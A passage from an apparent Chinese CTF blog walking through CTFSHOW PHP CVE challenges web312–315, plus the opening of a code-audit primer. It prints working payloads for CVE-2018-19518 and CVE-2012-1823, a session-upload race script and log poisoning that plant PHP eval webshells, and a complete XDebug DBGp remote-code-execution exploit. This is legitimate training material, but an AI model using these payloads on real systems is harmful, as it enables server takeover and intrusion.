fl0gHe1e.txt</code>即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810143935819.png"></p><h3 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h3><p>打开题目，可以看到一个邮箱登录框</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810160427800.png"></p><p>目标环境为Nginx和PHP5.6.38</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810160719779.png"></p><p>网上搜索一番，发现<strong>CVE-2018-19518</strong>符合我们的要求</p><p>参考链接：<a href="https://blog.csdn.net/weixin_45605352/article/details/116517889">https://blog.csdn.net/weixin_45605352/article/details/116517889</a></p><p><strong>什么是IMAP</strong></p><p>IMAP（Internet Message Access Protocol，互联网邮件访问协议）是一种用于从邮件服务器远程访问和管理电子邮件的标准协议。与传统的POP3不同，IMAP允许用户在多个设备上同步邮箱状态，邮件内容保留在服务器上，用户对邮件的操作如读取、删除都会实时反馈到服务器，便于多设备协同管理邮箱，实现更灵活和在线的邮件访问体验，通常端口是143</p><p><strong>漏洞描述</strong></p><p><strong>CVE-2018-19518</strong>是PHP IMAP远程命令执行漏洞，漏洞存在于PHP IMAP扩展的<code>imap_open()</code>函数，该函数用于连接IMAP邮件服务器，受到影响的环境通常运行在类Unix系统上，PHP通过<code>imap_open</code>连接远程IMAP服务时会调用底层<code>rsh</code>命令尝试连接</p><p><strong>漏洞成因</strong></p><p><code>imap_open()</code>函数中，IMAP服务器名称作为参数传递给<code>rsh</code>（远程shell）命令，在部分系统中，<code>rsh</code>命令被替换为<code>ssh</code>（比如Debian、Ubuntu），而ssh支持更多复杂的命令参数。攻击者可以在构造的IMAP服务器名称中注入<code>-oProxyCommand=</code>参数，这些参数被<code>ssh</code>解释执行，从而执行任意系统命令</p><p><code>imap_open(string $mailbox , string $username , string $password)</code>函数中的<code>mailbox</code>是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行</p><p><strong>影响范围</strong></p><p>漏洞影响PHP多个版本，包括5.6.0至5.6.38，7.0.0至7.0.32，7.1.0至7.1.24，7.2.0至7.2.12等版本</p><p>现在回到题目，先随便输入几个数，看看表单数据</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810164512552.png"></p><p>可以看到这里POST上传了三个参数，因为<code>imap_open(string $mailbox , string $username , string $password)</code>函数中的<code>mailbox</code>是执行命令参数的一部分，所以我们可以通过更改它来进行命令注入执行</p><p>原始payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand=echoecho &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; /var/www/html/1.php|base64-d|sh&#125;</span><br></pre></td></tr></table></figure><p>对内容进行base64编码，符号进行URL编码，%3d是等号，%09是制表符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;</span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh&#125;&amp;username=111&amp;password=222</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250810165930582.png"></p><p>显示下面结果即为成功</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810170210991.png"></p><p>然后蚁剑连接webshell</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810170321097.png"></p><p>成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810170351080.png"></p><h3 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h3><p>打开题目，先看看目标环境</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810183728081.png"></p><p>也是Nginx + PHP，且PHP版本为5.4.1，上网搜索对应可能的漏洞，发现<strong>CVE-2012-1823</strong>符合我们的要求</p><p>参考链接：<a href="https://www.cnblogs.com/lthlsy/p/14820076.html">https://www.cnblogs.com/lthlsy/p/14820076.html</a></p><p><strong>漏洞描述</strong></p><p><strong>CVE-2012-1823</strong> 是 PHP-CGI 远程代码执行漏洞，主要出现在 PHP-CGI 模式下。该模式下 PHP 响应 HTTP 请求的方式存在缺陷，导致攻击者能够通过特别构造的 URL 参数，动态修改 PHP 的运行时配置</p><p><strong>漏洞成因</strong></p><p>漏洞来源于 PHP-CGI 对命令行参数的处理不严谨，攻击者可以在 URL 中插入以 <code>-d</code> 开头的参数（如 <code>-d allow_url_include=1 -d auto_prepend_file=php://input</code>），这些参数本应只由命令行传递，却被 PHP-CGI 错误地解析为运行配置。这就允许攻击者开启危险功能，或通过指定 <code>auto_prepend_file</code> 使 PHP 在执行时读取并执行 HTTP 请求体中的恶意代码，从而实现远程执行任意 PHP 代码</p><p><strong>影响范围</strong></p><p>该漏洞影响 <strong>PHP 5.3.x 和 5.4.x</strong> 的早期版本（PHP &lt; 5.3.12 ，PHP &lt; 5.4.2），尤其是在使用 CGI 模式处理请求的环境中更易受害。生产环境中，许多使用 Nginx 反向代理 PHP-CGI 的站点因未做适当配置而成为攻击目标</p><p>CGI模式下有如下可控命令行参数可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-c 指定php.ini文件的位置</span><br><span class="line"></span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line"></span><br><span class="line">-d 指定配置项</span><br><span class="line"></span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line"></span><br><span class="line">-s 显示文件源码</span><br><span class="line"></span><br><span class="line">-T 执行指定次该文件</span><br><span class="line"></span><br><span class="line">-h和-? 显示帮助</span><br></pre></td></tr></table></figure><p>可以用<code>-s</code>显示文件源码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810185825819.png"></p><p>证明确实存在该漏洞，接下来就是执行payload了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input</span><br></pre></td></tr></table></figure><p>URL编码，%3d是等号，%3a是冒号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a//input</span><br></pre></td></tr></table></figure><p>然后请求体写PHP代码执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250810190757565.png"></p><p>最后在<code>/somewhere</code>找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810190931134.png"></p><h3 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h3><p>打开题目，可以看到给出了源码，但是由于禁了冒号，没办法用伪协议</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810200507829.png"></p><p>可以正常读取文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810200930152.png"></p><p>扫描目录，发现有个<code>/phpinfo.php</code>，题目里的源码注释也有提示</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810201944197.png"></p><p>拼接进URL访问，发现开启了session，且<strong>session.name</strong>为PHPSESSID</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810202501457.png"></p><p>可以用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含，用到条件竞争</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://b14a333f-6a35-4dea-b3e3-d016a1f023b2.challenge.ctf.show/&#x27;</span></span><br><span class="line">file_name=<span class="string">&quot;/var/www/html/1.php&quot;</span></span><br><span class="line">file_content=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">f&quot;&lt;?php echo &#x27;success!&#x27;; file_put_contents(&#x27;<span class="subst">&#123;file_name&#125;</span>&#x27;,&#x27;<span class="subst">&#123;file_content&#125;</span>&#x27;);?&gt;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">        session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;hello&#x27;</span>&#125;,data=data,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;xxx&#x27;</span>,f)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?f=/tmp/sess_hello&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;success!&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;写入成功，访问1.php getshell&quot;</span>)</span><br><span class="line">            event.clear()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure><p>显示写入成功即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810203046230.png"></p><p>蚁剑连接webshell</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810203155406.png"></p><p>在根目录成功找到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810203220900.png"></p><p>还有一个方法就是<strong>用UA头进行日志文件包含</strong></p><p>URL拼接参数<code>?f=/var/log/nginx/access.log</code>，然后UA头写入<code>&lt;?php eval($_POST[1]);?&gt;</code>，最后Body写入命令POST发送执行即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810204813065.png"></p><p>执行命令得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810205435637.png"></p><h3 id="web315"><a href="#web315" class="headerlink" title="web315"></a>web315</h3><p>题目提示debug开启，端口9000</p><p>上网搜了一下对应漏洞，发现<strong>XDebug 远程调试漏洞</strong>符合我们的要求</p><p>参考链接：<a href="https://blog.csdn.net/zy15667076526/article/details/111824491">https://blog.csdn.net/zy15667076526/article/details/111824491</a></p><p><strong>XDebug 远程调试漏洞</strong>是一种因XDebug扩展的远程调试功能配置不当而引发的严重安全风险。XDebug是PHP的一个调试扩展，主要帮助开发者远程调试PHP代码，比如通过IDE连接服务器进行代码断点调试。当XDebug开启远程调试且配置了<code>xdebug.remote_connect_back=1</code>（或在新版XDebug中对应的<code>xdebug.discover_client_host=1</code>），XDebug会自动尝试连接发起HTTP请求客户端的IP地址以建立调试会话</p><p>这个自动“回连”机制如果暴露在公网环境中，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）。连接建立后，攻击者可以通过调试协议(DBGp)主动执行PHP代码，利用该功能中的eval接口实现任意代码执行（RCE）。由于XDebug调试协议没有身份验证，攻击者几乎可以完全控制运行PHP代码的服务器进程</p><p>我们可以输入<code>/index.php?XDEBUG_SESSION_START=phpstorm</code>验证一下</p><p><img src="https://oss.waynejoons.icu/picphoto/20250810212351291.png"></p><p>响应头中出现了 <code>Set-Cookie: XDEBUG_SESSION=phpstorm</code>，这表示服务器上的 PHP 在启用了 XDebug 调试扩展，并且远程调试功能被激活了，因此可以判断漏洞存在</p><p>这个漏洞的利用要用到脚本，可以命名为<code>exp.py</code></p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">server_done = threading.Event()</span><br><span class="line">server_started = threading.Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_xml</span>(<span class="params">sock: socket.socket</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data from %s&#x27;</span>, <span class="variable language_">self</span>.client_address)</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(<span class="variable language_">self</span>.server.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line">        data = recv_xml(<span class="variable language_">self</span>.request)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">        g = re.search(<span class="string">rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">            logging.warning(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        data = g.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">            server_done.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] May be not string result: %s&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, handler_class, code</span>):</span><br><span class="line">        <span class="variable language_">self</span>.code = code</span><br><span class="line">        <span class="variable language_">self</span>.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(server_address, handler_class)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">server_activate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().server_activate()</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Server %s started&#x27;</span>, <span class="variable language_">self</span>.server_address)</span><br><span class="line">        server_started.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_dbgp_server</span>(<span class="params">port: <span class="built_in">int</span>, code: <span class="built_in">str</span></span>):</span><br><span class="line">    server = XDebugServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, port), XDebugRequestHandler, code)</span><br><span class="line">    server_thread = threading.Thread(target=server.serve_forever, daemon=<span class="literal">True</span>)</span><br><span class="line">    server_thread.start()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> server_thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_debug_session</span>(<span class="params">url: <span class="built_in">str</span>, attack_ip: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_started.wait(timeout=<span class="number">5</span>)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Trigger debug session&#x27;</span>)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> attack_ip:</span><br><span class="line">            headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>] = attack_ip</span><br><span class="line"></span><br><span class="line">        requests.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&amp;XDEBUG_SESSION=1&amp;XDEBUG_TRIGGER=1&#x27;</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--dbgp-ip&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;dbgp server ip address, must can be accessed from target server.&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    start_dbgp_server(<span class="number">9000</span>, args.code)</span><br><span class="line">    start_dbgp_server(<span class="number">9003</span>, args.code)</span><br><span class="line">    threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Wait with a timeout, but check for interrupts</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">if</span> server_done.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] Execution timed out&#x27;</span>)            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logging.info(<span class="string">&#x27;[*] Received keyboard interrupt, exiting...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>然后执行命令，这里用题目给的备用地址<a href="http://pwn.challenge.ctf.show:28100/">http://pwn.challenge.ctf.show:28100/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c <span class="string">&#x27;shell_exec(&quot;ls&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250810215040209.png"></p><p><code>cat flaaaxx.php</code>即可，成功拿到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c <span class="string">&#x27;shell_exec(&quot;cat flaaaxx.php&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250810214935811.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;8838-562d8118-4706-427f-8be2-a89a45c752cb&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">CTFSHOW phpCVE专题详细题解</summary>
    
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/categories/CTFSHOW/"/>
    
    
    <category term="CTFSHOW" scheme="https://waynejoon.github.io/tags/CTFSHOW/"/>
    
    <category term="CTF练习" scheme="https://waynejoon.github.io/tags/CTF%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | 代码审计 web301 - web310</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-code-audit-web301-web310/</id>
    <published>2025-08-08T11:46:52.000Z</published>
    <updated>2025-08-08T11:50:33.345Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是代码审计"><a href="#什么是代码审计" class="headerlink" title="什么是代码审计"></a>什么是代码审计</h2><p>代码审计（Code Audit），也称为白盒测试（White-Box Testing），是一种安全评估方法。与黑盒测试相反，审计人员在<strong>拥有应用程序完整源代码</strong>的情况下，对程序的逻辑、结构和代码实现进行深入的分析和审查</p><h2 id="代码审计一般思路"><a href="#代码审计一般思路" class="headerlink" title="代码审计一般思路"></a>代码审计一般思路</h2><p>进行代码审计时，通常会结合自动化工具和人工审查，遵循一个由宏观到微观的系统性流程</p><p><strong>1. 准备阶段 (Preparation)</strong></p><p>这是审计的起点，目的是为后续的深入分析做好准备</p><ul><li><strong>理解业务逻辑</strong>：首先要通读文档或大致浏览代码，理解这个程序是做什么的、核心功能有哪些</li><li><strong>熟悉技术栈和框架</strong>：确定项目使用的编程语言（如PHP、Java、Python）、框架（如ThinkPHP、Spring、Django）和关键组件，了解特定框架的已知漏洞和安全特性</li><li><strong>部署运行环境</strong>：如果条件允许，在本地搭建一个可以运行和调试的测试环境。可以动态地跟踪数据流，验证漏洞，极大地提高审计效率</li></ul><p><strong>2. 自动化扫描与手动分析 (Scanning &amp; Manual Review)</strong></p><p>这个阶段是审计的核心，通常会从寻找高风险的“入口点”和“危险函数”开始</p><ul><li><strong>寻找数据入口（“入”）</strong>：首先要定位用户能够控制数据输入的地方，这些是漏洞最有可能产生的地方<ul><li><strong>全局变量</strong>：如PHP中的 <code>$_GET</code>、<code>$_POST</code>、<code>$_COOKIE</code>、<code>$_REQUEST</code>、<code>$_SERVER</code> 等，它们是外部数据进入程序的主要通道</li><li><strong>文件操作</strong>：关注文件上传、文件读取&#x2F;写入等功能点</li><li><strong>数据库交互</strong>：所有与数据库进行增、删、改、查操作的地方</li></ul></li><li><strong>跟踪数据流（“流”）</strong>：从找到的入口点开始，跟踪这些外部数据在代码中的传递路径。观察数据在传递过程中是否经过了充分的<strong>过滤、净化或编码</strong>。这是判断是否存在漏洞的关键</li><li><strong>定位危险函数（“出”）</strong>：审计的另一个核心是寻找那些能直接导致漏洞的“危险函数”或“敏感操作”，然后<strong>逆向回溯</strong>，看它们的参数是否能被用户的输入所控制<ul><li><strong>SQL注入</strong>：关注所有执行SQL查询的函数，如 <code>query()</code>, <code>execute()</code> 